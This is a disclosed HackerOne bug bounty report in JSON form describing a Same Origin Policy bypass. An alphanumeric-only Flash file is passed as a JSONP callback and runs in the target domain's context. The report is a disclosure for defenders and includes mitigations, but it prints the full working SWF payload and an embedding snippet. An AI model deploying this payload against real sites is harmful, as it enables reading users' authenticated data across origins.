{
  "id": 10373,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDM3Mw==",
  "url": "https://hackerone.com/reports/10373",
  "title": "Bypassing Same Origin Policy With JSONP APIs and Flash",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2014-04-29T23:54:14.670Z",
  "submitted_at": "2014-04-29T23:54:14.670Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "molnarg",
    "url": "/molnarg",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEKKHYW6%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T120748Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCgJA5DGOcMvhFxaGDwdi44SBuHltBcYDk9sZIWU113SgIhALvJnz%2F9GzKCp0Qi9Zbw3Bp6FryCLaZlb32EnWgdDfGkKrIFCCsQAxoMMDEzNjE5Mjc0ODQ5IgyIEI%2F1dpPNKPhmdNgqjwUX7tOLRxEIvySomIYg0Be01vnEloa6gkmODX4kKm0gaBkk%2BZTmsQamHaDN%2B37eqiUXURAPnnB64IuwjaiBXm46WS%2BbPdmt4Ui5sMcW27SziHHK25CZi%2FmThzv2MYfY3O50TEileDq%2BVDdXr7KTnGi1SfH26%2B5CkWatoZohGV5IBOpEcMDQRM4STmg4xdUh9GyS5ODiqkUeoLy3xEgW5yv04ctjkJFlHXtqiHNXHm24DLeZiOQR7Qt4evjNSNnOdQhi3bGZlylFAMG32u5%2FZmS1vqQ%2BCOIPlrx4QL%2Bct15VIrT4uQeUlJ8n0Y8XG2WKx8kRUZ%2BBkmf%2BS0iadtfu3c12TIyNujSnskF5O361TqjeM4FCX94ViMELQfpoIizi5H8BURzjSpDJiwp339wCSBLSVAJLOQR%2BURdDnkVvFGB%2FzTSZ7ZwetftrWIyGYKjPhkb7HawbcQYfQk2G3OylboNGgEXOg0ksRi%2FSGELIBvCxQYF8uQe%2BfNaccii461DXKP7j0cjMLx1Uq9qEwCiABivkTRN4KqFcAIWg3RMNJkQg3QoQsBV%2Fyrdi9V9iMKY8Z0d8QiYFK4hyu9DotQBXy7Y7sW7X9k1Bhc1f1ZSFUs4XrqRNecY3bNuu003x488COq4ehDpM6wyxGP4RihspSa7G4I77bKxG8qkBtUhjYVnLy%2FGR1iPuAYhNiHAyFIPvrfJ%2F10Tr2ElEpB19168dMBFRlY1aB02wuiOxjy29RIFIUF9gFXpgYc1Pn4cxftZ4H8zWo9z%2FBI6qAMGEdca%2FlRqXDSOipkvgGkYEPqQs%2B26noQWf2Cr1Y3vMLUWt%2FpYCuWLUkW53Y6edY45H9eOU%2BXoQ8cMWoGLZCnJyhqo31qFhMLe5xMYGOrABtLXC0%2FiqeqMGsZLaLzHQ9Kb7stkWqZtBywwhgZVrKqLjBFT9ihcWPQ8Aho80Fox0jCmSC1TjRJHQuIxNdbWfSXdN8qmBBOIKwu32m7Mx24IQqEbhUmOT7V%2B8CTOKFRTbr63lrettXtqqywR3Njma%2Fql3bZ43rT1Otomr77qdFA8opx0OeupS4CoRClfSSMwZHWedBg2kPegoPl5VUhUddIX1pol0i0QsdcoPtUP5COU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dafa100fa327dc7a6475da0edb56de58430e1dcc5168cdd52bb4a491848b16ea",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEKKHYW6%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T120748Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCgJA5DGOcMvhFxaGDwdi44SBuHltBcYDk9sZIWU113SgIhALvJnz%2F9GzKCp0Qi9Zbw3Bp6FryCLaZlb32EnWgdDfGkKrIFCCsQAxoMMDEzNjE5Mjc0ODQ5IgyIEI%2F1dpPNKPhmdNgqjwUX7tOLRxEIvySomIYg0Be01vnEloa6gkmODX4kKm0gaBkk%2BZTmsQamHaDN%2B37eqiUXURAPnnB64IuwjaiBXm46WS%2BbPdmt4Ui5sMcW27SziHHK25CZi%2FmThzv2MYfY3O50TEileDq%2BVDdXr7KTnGi1SfH26%2B5CkWatoZohGV5IBOpEcMDQRM4STmg4xdUh9GyS5ODiqkUeoLy3xEgW5yv04ctjkJFlHXtqiHNXHm24DLeZiOQR7Qt4evjNSNnOdQhi3bGZlylFAMG32u5%2FZmS1vqQ%2BCOIPlrx4QL%2Bct15VIrT4uQeUlJ8n0Y8XG2WKx8kRUZ%2BBkmf%2BS0iadtfu3c12TIyNujSnskF5O361TqjeM4FCX94ViMELQfpoIizi5H8BURzjSpDJiwp339wCSBLSVAJLOQR%2BURdDnkVvFGB%2FzTSZ7ZwetftrWIyGYKjPhkb7HawbcQYfQk2G3OylboNGgEXOg0ksRi%2FSGELIBvCxQYF8uQe%2BfNaccii461DXKP7j0cjMLx1Uq9qEwCiABivkTRN4KqFcAIWg3RMNJkQg3QoQsBV%2Fyrdi9V9iMKY8Z0d8QiYFK4hyu9DotQBXy7Y7sW7X9k1Bhc1f1ZSFUs4XrqRNecY3bNuu003x488COq4ehDpM6wyxGP4RihspSa7G4I77bKxG8qkBtUhjYVnLy%2FGR1iPuAYhNiHAyFIPvrfJ%2F10Tr2ElEpB19168dMBFRlY1aB02wuiOxjy29RIFIUF9gFXpgYc1Pn4cxftZ4H8zWo9z%2FBI6qAMGEdca%2FlRqXDSOipkvgGkYEPqQs%2B26noQWf2Cr1Y3vMLUWt%2FpYCuWLUkW53Y6edY45H9eOU%2BXoQ8cMWoGLZCnJyhqo31qFhMLe5xMYGOrABtLXC0%2FiqeqMGsZLaLzHQ9Kb7stkWqZtBywwhgZVrKqLjBFT9ihcWPQ8Aho80Fox0jCmSC1TjRJHQuIxNdbWfSXdN8qmBBOIKwu32m7Mx24IQqEbhUmOT7V%2B8CTOKFRTbr63lrettXtqqywR3Njma%2Fql3bZ43rT1Otomr77qdFA8opx0OeupS4CoRClfSSMwZHWedBg2kPegoPl5VUhUddIX1pol0i0QsdcoPtUP5COU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=04c2b7027399b557c9768e83ef94cf2d2670ca9e8095294d934b19f6e528b531"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2014-07-19T17:32:22.258Z",
  "bug_reporter_agreed_on_going_public_at": "2014-07-19T13:03:05.495Z",
  "team_member_agreed_on_going_public_at": "2014-07-19T17:32:21.959Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Overview\n========\n\nThis is a new type of web vulnerability that is made possible by two seemingly unrelated things:\n\n- the way JSONP APIs work\n- the way Flash handles malformed SWF files\n\nand has an effect and limitations similar to XSS flaws:\n\n- the user has to visit a website set up by the attacker in order to trigger the vulnerability\n- as a result, the attacker can make arbitrary HTTP request to the vulnerable domain (with the user's cookies sent along with the request) and read the responses\n\nDescription\n===========\n\n[JSONP] APIs return JSON data wrapped by an invocation of a callback function specified by the caller.  The caller first defines a JavaScript function and then injects a script tag with the JSON API URL as if it were a JavaScript file to load. JSONP APIs became popular because making JSONP requests are is not forbidden by the Same Origin Policy.\n\nFrom the point of view of this discussion, the important part is that **the first bytes of the response can be controlled by a GET parameter** (typically named callback).\n\nIf an attacker can create a Flash file, that can be passed as callback parameter to a JSONP API, and passes the filters applied to the callback name, then she is able to load this Flash file in the security context of the JSONP API's domain (the target domain). After the Flash file is loaded, she can make HTTP requests through it to the target domain in the name of the user.\n\nExample:\n\n    <object type=\"application/x-shockwave-flash\"\n            data=\"http://example.com/jsonp-api?callback=__URL_ENCODED_SWF__\">\n      <param name=\"AllowScriptAccess\" value=\"always\">\n    </object>\n\nThe response to the HTTP request:\n\n    __SWF_FILE__({\"actual\": \"API\", \"response\": 15})\n\nThere is two significant problems that have to be solved by an attacker:\n\n 1. the end of the response is the actual JSON API response, and that makes the response as a whole an invalid SWF file.\n 2. callback names are almost always filtered, forcing the callback parameter into the [A-Za-z0-9] range\n\nThe first problem is in fact solved by the way **Flash** handles invalid SWF files: it **ignores additional bytes at the end of an otherwise valid Flash file**.\n\nThe second problem turns out to be solvable too. The SWF file format specifies a way to compress the whole file (except an 8 byte header) as a DEFLATE stream. **It is possible to create a DEFLATE stream in the [A-Za-z0-9] character range for arbitrary binary data.** (As proven by my [ascii-zip] project)\n\nAs a demonstration, I've created a Flash file in the given character range that can load an arbitrary SWF file given by the embedder site (the attacker website) into it's security context (the target domain's security context):\n\n    CWSA7000hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtWGDtGDGwwwDDGDG0Gt0GDGwtGDG0sDttwwwDG33w0sDDt03G33333sDfBDIHTOHHoKHBhHZLxHHHrlbhHHtHRHXXHHHdHDuYAENjmENDaqfvjmENyDjmENJYYfmLzMENYQfaFQENYnfVNx1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwwEDG3w0sG0stDDGtw0GDDwwwt3wt333333w03333gFPaEIQSNvTnmAqICTcsacSCtiUAcYVsSyUcliUAcYVIkSICMAULiUAcYVq9D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwuG333swG033GDtpDtDtDGDD33333s03333sdFPOwWgotOOOOOOOwodFhfhFtFLFlHLTXXTXxT8D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7kiudIbEAt33swwEGDDtDG0GGDDwwwDt0wDGwwGG0sDDt033333GDt333swwv3sFPDtdtthLtDdthTthxthXXHHHHhHHHHHHhHXhHHHHXhXhXHXhHhiOUOsxCxHwWhsXKTgtSXhsDCDHshghSLhmHHhDXHhEOUoZQHHshghoeXehMdXwSlhsXkhehMdhwSXhXmHH5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwGNqdIbe133333333333333333sUUef03gfzA8880HUAH\n\nThe embedder site can specify the SWF to load through the \"name\" property of the object tag. The specified SWF file could be a [cross domain proxy] that can make HTTP requests for the embedder site.\n\nRelated work\n============\n\nThis attack is inspired by Alok Menghrajani's [related work], where he showed that it is possible to assemble a Flash file in the [\\x01-\\0x7F] byte range to prove that certain JSONP endpoints are not secure.\n\nThe real contribution of my work is the demonstration of the fact that this attack is also feasible in the [A-Za-z0-9] character range. This is critical because overwhelming majority of the JSONP endpoints only accept this character range in the callback name.\n\nMitigation\n==========\n\nLimiting the callback name length is not a good solution, as there is no strong guarantee that it is not possible to come up with an SWF file that conforms to this tightened filter.\n\nThe API maintainer can mitigate this type of attack by **putting an empty JavaScript callback in front of the callback name in the repsonse**. This makes it impossible to control the first bytes of the response.\n\nAn other protection would be **hosting JSONP APIs on a sandbox domain**. The latter solution is only effective if there's no crossdomain.xml rule that would allow requests from the sandbox domain to the main domain.\n\nA proper solution would be **changing the way Flash handles malformed SWF files so that it won't files with additional data at the end of the SWF file**.\n\nAlthough one of the mitigations is fixing Flash, I don't consider this a Flash vulnerability, as an affected site does not even have to use the Flash technology in order to be vulnerable.\n\nAffected sites\n==============\n\nI've tested the 35 top websites on Wikipedia's (somewhat out of date) copy of the Alexa [toplist](http://en.wikipedia.org/wiki/List_of_most_popular_websites) (after unifying www.google.* domains into a single entry), and 16 (~45%) of them proved to be vulnerable.\n\nThe unaffected sites fall into the following categories:\n- Sites that simply don't have any JSONP API.\n- Google and Facebook: JSONP answers from these sites begin with empty JavaScript comments (probably because they are being extremely cautious and implemented this protection after the publication of Alok Menghrajani's [related work]).\n- Sites that host all JSONP APIs on a different domain (this is considered as a best practice) and don't have crossdomain.xml rule on the main site that enables cross domain requests from the API domain.\n- A single site limits the callback name length to 50 characters.\n\n[DEMO](https://gabor.molnar.es/bb/9bfb0835d1e72705bb374132c4d2cb3e9a4417e91b9be31a074fb7d644b34988/octameter.html)\n=======\n\nJSONP: http://json-p.org/\nascii-zip: https://github.com/molnarg/ascii-zip\ncross domain proxy: https://github.com/borisreitman/CrossXHR\nrelated work: http://quaxio.com/jsonp_handcrafted_flash_files/\ntoplist: http://en.wikipedia.org/wiki/List_of_most_popular_websites\n",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2014-08-18T13:03:05.798Z",
  "allow_singular_disclosure_after": -350175883.07113767,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "siyadlbug",
    "shivammusic",
    "zeroknife",
    "find0xt",
    "flexorium"
  ],
  "structured_scope": {
    "databaseId": 84121,
    "asset_type": "OTHER",
    "asset_identifier": "IBB (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
